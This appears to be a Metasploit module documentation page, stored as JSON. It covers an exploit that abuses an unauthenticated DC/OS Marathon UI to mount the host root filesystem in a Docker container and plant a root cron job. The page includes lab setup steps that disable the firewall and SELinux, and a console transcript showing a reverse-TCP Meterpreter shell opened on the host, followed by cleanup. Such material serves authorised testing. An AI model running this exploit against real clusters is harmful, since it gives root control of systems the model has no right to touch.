{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/dcos_marathon","result":{"data":{"moduleMetadataJson":{"id":"e629b9e7-2803-50a9-b464-26a6c113c7a9","name":"DC/OS Marathon UI Docker Exploit","fullname":"exploit/linux/http/dcos_marathon","description":"Utilizing the DCOS Cluster's Marathon UI, an attacker can create\n        a docker container with the '/' path mounted with read/write\n        permissions on the host server that is running the docker container.\n        As the docker container executes command as uid 0 it is honored\n        by the host operating system allowing the attacker to edit/create\n        files owed by root. This exploit abuses this to creates a cron job\n        in the '/etc/cron.d/' path of the host server.\n\n        *Notes: The docker image must be a valid docker image from\n        hub.docker.com. Furthermore the docker container will only\n        deploy if there are resources available in the DC/OS cluster.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/dcos_marathon","documentationSlug":"/modules/documentation/exploit/linux/http/dcos_marathon","referencesSlug":"/modules/references/exploit/linux/http/dcos_marathon"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Utilizing the DCOS Cluster's Marathon UI, an attacker can create\na docker container with the '/' path mounted with read/write\npermissions on the host server that is running the docker container.\nAs the docker container executes command as uid 0 it is honored\nby the host operating system allowing the attacker to edit/create\nfiles owed by root. This exploit abuses this to creates a cron job\nin the '/etc/cron.d/' path of the host server.</p>\n<p>*Notes: The docker image must be a valid docker image from\nhub.docker.com. Further more the docker container will only\ndeploy if there are resources available in the DC/OS</p>\n<h2 id=\"dcos\" style=\"position:relative;\"><a href=\"#dcos\" aria-label=\"dcos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DCOS</h2>\n<p>This Exploit was tested with CentOS 7 as the host operating system for\nthe 2 services of the DCOS cluster. With DCOS version 1.7 and 1.8, with\nDefault 'custom' installation for on site premise setup. Only the Install\npart of the DCOS guide was completed, the system hardening and securing\nyour cluster section where skipped. This is to represent a 'Default' install\nwith a system admin conducting hasty deployments taking no thought about security.</p>\n<h2 id=\"to-setup-your-cluster\" style=\"position:relative;\"><a href=\"#to-setup-your-cluster\" aria-label=\"to setup your cluster permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>To Setup Your Cluster</h2>\n<p>I recommend doing a 'on-premise'/custom\ncluster. <a href=\"https://dcos.io/docs/1.8/administration/installing/custom/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://dcos.io/docs/1.8/administration/installing/custom/</a>\nCreate a virtual CentOS machine, install requirements base on the above\nguide.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token comment\"># The TLDR from the above guide</span>\n<span class=\"token function\">sudo</span> systemctl stop firewalld <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">sudo</span> systemctl disable firewalld\n<span class=\"token function\">sudo</span> yum <span class=\"token function\">install</span> -y <span class=\"token function\">tar</span> xz <span class=\"token function\">unzip</span> <span class=\"token function\">curl</span> ipset ntp\n<span class=\"token function\">sudo</span> systemctl start ntpd\n<span class=\"token function\">sudo</span> systemctl <span class=\"token builtin class-name\">enable</span> ntpd\n<span class=\"token function\">sudo</span> <span class=\"token function\">sed</span> -i s/SELINUX<span class=\"token operator\">=</span>enforcing/SELINUX<span class=\"token operator\">=</span>permissive/g /etc/selinux/config <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">\\</span>\n   <span class=\"token function\">sudo</span> <span class=\"token function\">groupadd</span> nogroup <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">sudo</span> <span class=\"token function\">reboot</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Install a supported version of docker on the CentOS systems\n<a href=\"https://dcos.io/docs/1.8/administration/installing/custom/system-requirements/install-docker-centos/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://dcos.io/docs/1.8/administration/installing/custom/system-requirements/install-docker-centos/</a></p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token comment\"># The TLDR of the above guide</span>\n<span class=\"token function\">sudo</span> yum -y remove docker docker-common container-selinux\n<span class=\"token function\">sudo</span> yum -y remove docker-selinux\n<span class=\"token function\">sudo</span> yum <span class=\"token function\">install</span> -y yum-utils\n<span class=\"token function\">sudo</span> yum-config-manager <span class=\"token punctuation\">\\</span>\n   --add-repo <span class=\"token punctuation\">\\</span>\n   https://docs.docker.com/engine/installation/linux/repo_files/centos/docker.repo\n<span class=\"token function\">sudo</span> yum-config-manager --enable docker-testing\n<span class=\"token function\">sudo</span> yum makecache fast\n<span class=\"token function\">sudo</span> yum -y <span class=\"token function\">install</span> docker-engine-1.11.2\n<span class=\"token function\">sudo</span> systemctl start docker\n<span class=\"token function\">sudo</span> systemctl <span class=\"token builtin class-name\">enable</span> docker\n<span class=\"token function\">sudo</span> <span class=\"token builtin class-name\">echo</span> overlay <span class=\"token operator\">></span> /etc/modules-load.d/overlay.conf\n<span class=\"token function\">sudo</span> <span class=\"token function\">reboot</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Once the CentOS machine has rebooted, edit the systemctl\nservice file for docker and change the ExecStart- line to\n<code class=\"language-text\">ExecStart=/usr/bin/docker daemon --storage-driver=overlay -H fd://</code>\nrestart the docker service and verify it is running.\nlastly generate ssh rsa keys for authentication. And update the\n/etc/ssh/sshd_config file to support root login.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">ssh-keygen -t rsa -b <span class=\"token number\">4096</span>\n<span class=\"token comment\"># Press enter until complete, DO NOT PUT A PASSWORD.</span>\n<span class=\"token function\">cp</span> ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys\n<span class=\"token function\">cat</span> ~/.ssh/id_rsa <span class=\"token comment\"># save the output you will need it for later</span>\n<span class=\"token function\">rm</span> ~/.ssh/id_rsa <span class=\"token comment\"># before doing this make sure you have saved a copy for later</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Shut down the CentOS vm, take a snapshot. (This will be your base)\nclone the VM 2 times. One will be DCOS-Master, the Other DCOS-Agent.\nStart the DCOS-Master and DCOS-Agent virtual machines You just cloned.\nLogin and get their current IP address.</p>\n<ul>\n<li>Note: I recommend giving them static IPs if you have further use for the cluster.</li>\n</ul>\n<p>From here use another Linux machine with docker installed to finish\nthe installation process. I used an Ubuntu machine with docker installed.</p>\n<p>Follow the custom CLI guide for creating the required files in\nthe genconf folder.\n<a href=\"https://dcos.io/docs/1.8/administration/installing/custom/cli/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://dcos.io/docs/1.8/administration/installing/custom/cli/</a></p>\n<p>Example genconf/config.yaml</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">---\nagent_list:\n- 192.168.0.10\nbootstrap_url: file:///opt/dcos_install_tmp\ncluster_name: DCOS\nexhibitor_storage_backend: static\nip_detect_filename: /genconf/ip-detect\nmaster_discovery: static\nmaster_list:\n- 192.168.0.9\nprocess_timeout: 10000\nresolvers:\n- 8.8.8.8\n- 8.8.4.4\nssh_port: 22\nssh_user: root</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Example genconf/ip-detect</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token shebang important\">#!/usr/bin/env bash</span>\n<span class=\"token builtin class-name\">set</span> -o nounset -o errexit\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span>/usr/sbin:/usr/bin:<span class=\"token environment constant\">$PATH</span>\n<span class=\"token assign-left variable\">ip</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">ip</span> addr show ens33<span class=\"token variable\">)</span></span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token variable\"><span class=\"token variable\">$(</span> <span class=\"token builtin class-name\">echo</span> $ip <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> -Eo <span class=\"token string\">'[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'</span> <span class=\"token operator\">|</span> <span class=\"token function\">head</span> -1<span class=\"token variable\">)</span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>place your id<em>rsa ssh key into the genconf file and rename the\nfile to ssh</em>key and <code class=\"language-text\">chmod 0600 genconf/ssh_key</code></p>\n<p>Deploying the cluster\nin the folder containing the genconf folder do the following.\nNOTE: if following the cli install from DCOS itself, it will fail\nif you do --install-prereqs. It will install an unsupported version of\ndocker.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token function\">curl</span> -O https://downloads.dcos.io/dcos/stable/dcos_generate_config.sh\n<span class=\"token function\">chmod</span> +x dcos_generate_config.sh\n<span class=\"token function\">sudo</span> ./dcos_generate_config.sh --genconf\n<span class=\"token function\">sudo</span> ./dcos_generate_config.sh --preflight\n<span class=\"token comment\"># If all preflight checks pass</span>\n<span class=\"token function\">sudo</span> ./dcos_generate_config.sh --deploy\n<span class=\"token comment\"># get a cup of coffie</span>\n<span class=\"token comment\"># wait a minute or two after deploy completes</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">bash</span> dcos_generate_config.sh --postflight</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>If all is passing navigate to <a href=\"http://%5Bmaster_ip%5D:8080/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://[master_ip]:8080/</a>\nYou should see the Marathon UI web application.</p>\n<h1 id=\"exploitation\" style=\"position:relative;\"><a href=\"#exploitation\" aria-label=\"exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h1>\n<p>This module is designed for the attacker to leverage, creation of a\ndocker container with out authentication through the DCOS Marathon UI\nto gain root access to the hosting server of the docker container\nin the DCOS cluster.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<ul>\n<li>DOCKERIMAGE is the hub.docker.com docker container image you are wanting to have the DCOS Cluster to deploy for this exploit.</li>\n<li>TARGETURI this is the path to make the Marathon UI web request to. By default this is /v2/apps</li>\n<li>WAIT_TIMEOUT is how long you will wait for a docker container to deploy before bailing out if it does not start.</li>\n<li>CONTAINER_ID is optional if you want to have your container docker have a human readable name else it will be randomly generated</li>\n</ul>\n<h2 id=\"steps-to-exploit-with-module\" style=\"position:relative;\"><a href=\"#steps-to-exploit-with-module\" aria-label=\"steps to exploit with module permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Steps to exploit with module</h2>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Start msfconsole</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> use exploit/linux/http/dcos_marathon</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set the options appropriately and set VERBOSE to true</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Verify it creates a docker container and it successfully runs</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> After a minute a session should be opened from the agent server</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/dcos_marathon\nmsf exploit(dcos_marathon) &gt; set RHOST 192.168.0.9\nRHOST =&gt; 192.168.0.9\nmsf exploit(dcos_marathon) &gt; set payload python/meterpreter/reverse_tcp\npayload =&gt; python/meterpreter/reverse_tcp\nmsf exploit(dcos_marathon) &gt; set LHOST 192.168.0.100\nLHOST =&gt; 192.168.0.100\nmsf exploit(dcos_marathon) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(dcos_marathon) &gt; check\n[*] 192.168.0.9:8080 The target appears to be vulnerable.\nmsf exploit(dcos_marathon) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.0.100:4444\n[*] Setting container json request variables\n[*] Creating the docker container command\n[*] The docker container is created, waiting for it to deploy\n[*] Waiting up to 60 seconds for docker container to start\n[*] The docker container is running, removing it\n[*] Waiting for the cron job to run, can take up to 60 seconds\n[*] Sending stage (39690 bytes) to 192.168.0.10\n[*] Meterpreter session 1 opened (192.168.0.100:4444 -&gt; 192.168.0.10:54468) at 2017-03-01 14:22:02 -0500\n[+] Deleted /etc/cron.d/FOWkTeZL\n[+] Deleted /tmp/TIWpOfUR\n\nmeterpreter &gt; sysinfo\nComputer        : localhost.localdomain\nOS              : Linux 3.10.0-327.36.3.el7.x86_64 #1 SMP Mon Oct 24 16:09:20 UTC 2016\nArchitecture    : x64\nSystem Language : en_US\nMeterpreter     : python/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e629b9e7-2803-50a9-b464-26a6c113c7a9"}}}